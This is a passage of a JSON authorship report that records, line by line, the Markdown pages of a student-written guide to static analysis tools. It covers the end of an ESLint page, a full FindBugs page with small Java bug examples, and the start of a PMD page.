        "content": "Custom rules can be [imported](https://eslint.org/docs/user-guide/configuring#using-the-configuration-from-a-plugin) via Plugins. You can [learn how to write your own](https://eslint.org/docs/developer-guide/working-with-plugins) or [use existing ones](https://www.npmjs.com/browse/keyword/eslintplugin) that are already published to npm."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "A popular plugin would be [eslint-plugin-lodash](https://github.com/wix/eslint-plugin-lodash) which is meant to enforce good practices and styling with the utility library [Lodash](https://lodash.com/). You can checkout other plugins [here](https://github.com/dustinspecker/awesome-eslint#plugins)."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "* [ESLint](https://eslint.org/)"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "* [ESLint Github](https://github.com/eslint/eslint): You can contribute to the project but remember to read their [guidelines](https://eslint.org/docs/developer-guide/contributing/) first"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "* [npm Developer Guide](https://docs.npmjs.com/misc/developers): If you\u0027re writing your own custom rules/configs, you need to know how to publish them on npm."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "* [Awesome ESLint](https://github.com/dustinspecker/awesome-eslint): repository for ESLint configs, plugins and other useful links."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "iskandarzulkarnaien": 10,
      "-": 146
    }
  },
  {
    "path": "contents/staticAnalysis/FindBugs.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: FindBugs"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# FindBugs"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Xiao Pu](https://nus-oss.github.io/cs3281-website/students/AY1617S2/xiaoPu/xiaoPu-Resume.html), [Shradheya Thakre](https://github.com/tshradheya)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Features](#features)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Examples of Bugs that can be found using FindBugs](#examples-of-bugs-that-can-be-found-using-findbugs)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Incorrectly overriding methods](#incorrectly-overriding-methods)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Find hash-equals mismatch](#find-hash-equals-mismatch)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Return value of method ignored](#return-value-of-method-ignored)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Null pointer dereference](#null-pointer-dereference)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to use it?](#how-to-use-it)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Configuration](#configuration)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Suppress Warnings](#suppress-warnings)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Running](#running)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [SpotBugs - The successor of Findbugs](#spotbugs-the-successor-of-findbugs)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Advanced Topics](#advanced-topics)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources](#resources)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "FindBugs is a static analysis tool to find bugs in **Java** programs. It looks for \u0027bug patterns\u0027 in the code and signals possible violations. Potential errors are classified in four ranks:"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "1. scariest"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "1. scary"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "1. troubling"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "1. of concern"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "This is a hint to the developer about their possible impact or severity. For example, the bug \u0027null pointer dereference\u0027 has the pattern — A program declares a non-nullable variable but assigns `null` to the variable somewhere and uses it later."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "## Features"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "The \"bug patterns\" can be divided into nine groups:"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "1. Bad practice"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "1. Correctness"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "1. Experimental"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "1. Internationalization"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "1. Malicious code vulnerability"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "1. Multithreaded correctness"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "1. Performance"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "1. Security"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "1. Dodgy code"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Refer to [FindBugs official documentation](http://findbugs.sourceforge.net/bugDescriptions.html) for a comprehensive list of bugs and the explanation of each bug."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "FindBugs analyses bytecode in compiled Java `.class` file and checks multiple files at the same time. This is unlike [CheckStyle](checkStyle.html) or [PMD](PMD.html) which can only check files one by one and analyse Java source code, allowing FindBugs to spot errors that would have been missed by CheckStyle and PMD. For example, one of the bug patterns in FindBugs is `RCN: Redundant nullcheck of value known to be non-null`. FindBugs will analyse all the assignments to a particular variable in the code base and then check whether the `nullcheck` for the variable is redundant or not."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Examples of Bugs That Can Be Found Using FindBugs"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Incorrectly Overriding Methods"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the following code:"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "class Foo {"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "    //... data members ..."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "    //... methods ..."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    //Overriding equals method - the wrong way"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "    public boolean equals(Foo foo) {"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "        //... logic ..."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "In the above code, if `foo.equals()` method is called, the `equals()` method of `Object` class rather than `Foo` class will be called. This is due to the way the Java code resolves overloaded methods at compile-time. FindBugs warns the developer of possible cases when a class defines a co-variant version of the `equals()` or `compareTo()` method."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Find Hash-Equals Mismatch"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "The hashCode() and equals() method are called by many `Collection` based classes like - List, Maps, Sets, etc. FindBugs helps in finding problems when a class **overrides the `equals()` but not the `hashCode()` method or vice-versa**. Overriding only one of the `equals()` or `hashCode()` method can cause methods of Collection based classes to fail and hence FindBugs helps in reporting these errors at an early stage"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Return Value of Method Ignored"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "FindBugs helps in finding places where your code has ignored the return value of method when it shouldn\u0027t have been."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "1 String s \u003d \"bob\";"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "2 s.replace(\u0027b\u0027, \u0027p\u0027);"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "3 boolean isCorrect \u003d s.equals(\"pop\"); //isCorrect is `false`"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "In the above examples, one would assume that the variable `isCorrect` is assigned `true` because the `line 2` replaces `b` with `p`. However since strings are immutable, the `replace()` function actually returns a new string with updated value rather than updating the string the method is called on."
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Hence, `line 2` should be `String newString  \u003d s.replace(\u0027b\u0027, \u0027p\u0027); //newString \u003d\"pop\"`"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Null Pointer Dereference"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "FindBugs looks for cases where a code path will or could cause a null pointer exception."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "1  Person person \u003d aMap.get(\"bob\");"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "2  if (person !\u003d null) {"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "3      person.updateAccessTime();"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "4  }"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "5  String name \u003d person.getName();"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, the `aMap` may or may not contain \"bob\", so FindBugs will report *possible* `NullPointerException` at `line 5`"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Use It?"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "### Configuration"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "You can tell FindBugs which bug patterns to exclude and include by using [FilterFiles](http://findbugs.sourceforge.net/manual/filter.html). By default, if no filter files are provided, FindBugs will run all checks."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "### Suppress Warnings"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "You can use filter files with `exclude` option in FindBugs as discussed above to suppress warnings."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "In addition, you can also use `SuppressWarnings` [annotation](http://findbugs.sourceforge.net/manual/annotations.html) to filter out unwanted violations."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "### Running"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "There are several ways to run FindBugs."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "GUI:"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "- [Using the FindBugs GUI](http://findbugs.sourceforge.net/manual/gui.html)"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "Command Line:"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "- [Command Line](http://findbugs.sourceforge.net/manual/running.html)"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Build Automation Tools:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ant Task](http://findbugs.sourceforge.net/manual/anttask.html)"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [FindBugs Maven Plugin](https://gleclaire.github.io/findbugs-maven-plugin/)"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "- [Gradle FindBugs](https://docs.gradle.org/current/userguide/findbugs_plugin.html)"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "IDE Integration:"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "- [Eclipse Integration](http://findbugs.sourceforge.net/manual/eclipse.html)"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "- [IntelliJ Integration](https://plugins.jetbrains.com/plugin/3847-findbugs-idea)"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "- [NetBeans Integration](https://netbeans.org/kb/docs/java/code-inspect.html)"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## SpotBugs - The Successor of Findbugs"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "On November 2016, FindBugs was [declared dead](https://mailman.cs.umd.edu/pipermail/findbugs-discuss/2016-November/004321.html) and [SpotBugs](https://spotbugs.github.io/) was [declared as its successor](https://mailman.cs.umd.edu/pipermail/findbugs-discuss/2017-September/004383.html) in September 2017."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The current projects using `FindBugs` can make a shift to `SpotBugs` by following the [migration manual](https://spotbugs.readthedocs.io/en/latest/migration.html)"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "## Advanced Topics"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "- [Data mining of bugs with FindBugs](http://findbugs.sourceforge.net/manual/datamining.html): The data for each analysis will be collected and you can use these statistics for data mining."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "- [Configure Analysis Properties](http://findbugs.sourceforge.net/manual/analysisprops.html#analysisproptable): You can define properties to configure options for some checks. For example, you can define the assertion methods in your project so that null pointer dereference bug detector will not raise violations if assertion methods are used."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "- [Use annotations](http://findbugs.sourceforge.net/manual/annotations.html): You can use annotations to indicate your intents so that FindBugs can issue warnings more appropriately."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing custom detectors](https://www.ibm.com/developerworks/library/j-findbug2/): You can follow the tutorial step by step to write your customised detector."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "- [FindBugs Official Website](http://findbugs.sourceforge.net): Official website of FindBugs. You can find more documentations here."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [An Evaluation of FindBugs](https://www.cs.cmu.edu/~aldrich/courses/654/tools/Sandcastle-FindBugs-2009.pdf): Analysis of FindBugs in 2009\u0027s version, some content may be outdated. Useful for understanding the benefits and drawbacks."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "- [Improve the quality of your code](https://www.ibm.com/developerworks/library/j-findbug1/): Some examples showing the bugs reported by FindBugs. You can get a rough idea of how FindBugs will help you in your project."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 7,
      "jamessspanggg": 3,
      "iskandarzulkarnaien": 18,
      "-": 142
    }
  },
  {
    "path": "contents/staticAnalysis/PMD.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: PMD"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# PMD"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Xiao Pu](https://nus-oss.github.io/cs3281-website/students/AY1617S2/xiaoPu/xiaoPu-Resume.html)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Features‎](#features)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Limitation‎](#limitation)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to use it?‎](#how-to-use-it)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Download‎](#download)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Configuration‎](#configuration)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Suppress Warnings‎](#suppress-warnings)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Command Line Usage‎](#command-line-usage)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Integration with Build Automation Tools‎](#integration-with-build-automation-tools)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Integration with IDEs‎](#integration-with-ides)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Available Rulesets‎](#available-rulesets)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How does it work?‎](#how-does-it-work)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Customization‎](#customization)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources‎](#resources)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "PMD is a static analyser for Java, JavaScript, Salesforce.com Apex, PL/SQL, Apache Velocity, XML, XSL. The copy/paste-detector([CPD](http://pmd.sourceforge.net/pmd-4.3.0/cpd.html)), which helps to find duplicated code, is also included as an add-on in PMD."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "*Note that the links in this chapter is based on [PMD version 5.5.3](https://pmd.github.io/pmd-5.5.3/). You can check the latest version and documentation at its [GitHub Page](https://pmd.github.io/).*"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "## Features"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Rules in PMD represent patterns in code. PMD is supposed to check these rules(patterns) and signal violations to programmers. For example, the `OverrideBothEqualsAndHashcode` rule requires programmers to override both `public boolean Object.equals(Object other)`, and `public int Object.hashCode()`, or override neither. "
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "PMD supports checking rules for the following languages."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
